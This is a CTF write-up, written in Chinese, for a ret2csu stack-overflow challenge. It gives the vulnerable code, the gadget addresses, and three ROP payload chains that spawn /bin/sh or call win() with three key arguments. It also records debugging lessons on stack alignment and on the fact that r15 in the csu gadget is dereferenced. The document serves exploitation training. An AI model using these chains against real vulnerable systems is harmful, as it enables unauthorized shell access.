## 2. 漏洞

```c
void vuln(void) {
  char buf[16];                     // rbp-0x10
  write(1, "Welcome to ret2csu.This time , you need three keys to open the door.\n", 0x45);
  read(0, buf, 0x100);              // <-- 0x100 写进 0x10 的栈缓冲区
}
```

覆盖返回地址偏移 = **16 (buf) + 8 (saved rbp) = 24**。No canary + No PIE + NX ⇒ 标准 **ROP**。
payload 上限 **0x100 = 256** 字节（这个限制后面卡过一次，见 §5-B2）。

## 3. "三扇门" / "三把钥匙"

```c
void win(int a, int b, int c) {
  if (a == 0x111 && b == 0x222 && c == 0x333) {
      write(1, "Congratulation! You got it!\n", 0x1c);
      system("/bin/sh");                       // "/bin/sh" 就在 0x402054
  } else {
      write(1, "The key is not correct.\n", 0x18);
  }
}
```

三扇门 = 三个 `if`；三把钥匙 = `0x111 / 0x222 / 0x333`；参数走 **rdi / rsi / rdx**。

程序里 gadget 极贫瘠，全 `.text` 只有：

```
0x401393: pop rdi ; ret                    (来自 __libc_csu_init 尾部)
0x40138a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x401370: mov rdx,r14 ; mov rsi,r13 ; mov edi,r12d ; call [r15+rbx*8]
0x401394: ret
```

> **没有 `pop rsi` / `pop rdx`。**

⇒ 要同时摆出 `rdi/rsi/rdx`，**只能**用 `__libc_csu_init` 的 **ret2csu 万能 gadget**。
这正是 Welcome 字符串点名的 `ret2csu`，也是题面的"**破门工具**"。
flag 内容 `R3t2csu_wh4t_4_mag1c_func7i0n` 也印证了这一点。

## 4. ★ 两个真正的坑（第一次都没踩对，记录于此避免重犯）

### 坑 1：栈对齐（glibc 2.31 `system()` 的 `movaps`）

实测 **ROP 入口 rsp ≡ 8 (mod 16)**（不是 0）。函数 `call` 要求执行时 rsp ≡ 0。

| 链路 | MOV_CSU / call 处 rsp | 结果 |
|---|---|---|
| 不垫 ret | ≡ 8 | ✘ `system` 里 `movaps %xmm0,0x50(%rsp)` → SIGSEGV |
| **先垫一个 `ret`(0x401394)** | ≡ 0 | ✔ |

两种链路都要垫。ret2csu 链路里垫在 POP_CSU **之前**。

### 坑 2（更隐蔽）：`call [r15+rbx*8]` 是**解引用 r15**，不是"跳到 r15"

这是第一次失败的真因，也是我最初**误判为"本机 WSL2 环境限制"**的原因 —— 那个结论是**错的**。

`r15` 必须指向**存放函数指针的内存**（例如 GOT 槽），而不是直接放函数地址：

| r15 取值 | `call [r15+rbx*8]` 实际跳到 | 结果 |
|---|---|---|
| `win` (0x401257) | `[0x401257]` = win 的头 8 字节 `0xe5894855fa1e0ff3` | ✘ SIGSEGV |
| `&system@got` (0x404020) | `[0x404020]` = system | ✔ 拿到 shell |
| `&read@got` (0x404028) | `[0x404028]` = read | ✔ 用来做两段式 |

旁证：`0x401370` 这一格在程序**正常启动**时是被 `_init` 用的，
`r15 = 0x403e10`（`.init_array`，里面**存着**函数指针）—— 这正是"指针的指针"语义。
而当时本机 gdb 里 `r15=0x401257, rbx=0` 完全正确，却仍在 call 处崩，就是因为解引用后拿到的是代码字节。

> 结论：远端 CSU 失败**不是**环境差异，而是这个语义错误；修好后本机 / 远端都可用。

## 5. 三条利用链（`scripts/20-solve.py`）

### A) `VARIANT=SYSTEM` — pop rdi;ret → system@plt  ← **远端实测拿到 flag**

```
buf[24] | pop rdi;ret | 0x402054 ("/bin/sh") | ret (对齐) | system@plt
```

### B1) `VARIANT=CSU` — ret2csu → `system@got`（"砸门"）

```
buf[24] | ret(对齐) | pop rbx..r15 | rbx=0 rbp=1 r12=0x402054 r13=0 r14=0 r15=&system@got
        | mov rdx,r14;mov rsi,r13;mov edi,r12d;call [r15+rbx*8]   -> system("/bin/sh")
```

### B2) `VARIANT=CSU_WIN` — 两段 ret2csu → `win(0x111,0x222,0x333)`（**三把钥匙完整版**）

二进制里没有任何内存存着 `win` 的地址，所以：

1. 第一段 ret2csu 调 `read(0, BSS, 8)`，把 `p64(win)` 写进 `.bss`（0x404200）
2. 第二段 ret2csu 令 `r15 = BSS` → `call [BSS]` = `call win(0x111,0x222,0x333)`

细节（gdb 实测，容易错）：
- 第一段置 `rbp=1`，`call` 回来后 `rbx=1` 与 `rbp` 相等 → 落到 `0x401386` 收尾
- 收尾是 `add rsp,8; pop rbx,rbp,r12,r13,r14,r15; ret`：
  **`add rsp,8` 跳过 tail[0]，6 个 pop 读 tail[1..6]，`ret` 读 tail[7]**
- 所以第一段 tail 要 8 个 qword，且第二段还要再垫一个 `ret` 修对齐
- **payload 总长 240 字节 ≤ 0x100**：第一段 `read(0,buf,0x100)` 会吃掉整段，
  超出的字节会串进第二段 `read(0,BSS,8)`，写进 `.bss` 的就不是 `win` 了
- 调用方（脚本 `exploit()`）在发完 payload 后**单独补发** `p64(win)`

## 8. 教训（给后续 pwn 题）

1. **ret2csu 的 `r15` 是指针**，不是函数地址 —— 用 GOT 槽最省事。
2. glibc 2.31 的 `system()` 对栈对齐敏感，`call` 前 rsp 必须 ≡ 0。
3. 别急着把"本机跑不通"归因于环境；先怀疑自己的链（我这次就误判过一次）。
4. `read(0,buf,N)` 的 payload 上限会咬人，两段式很容易超。
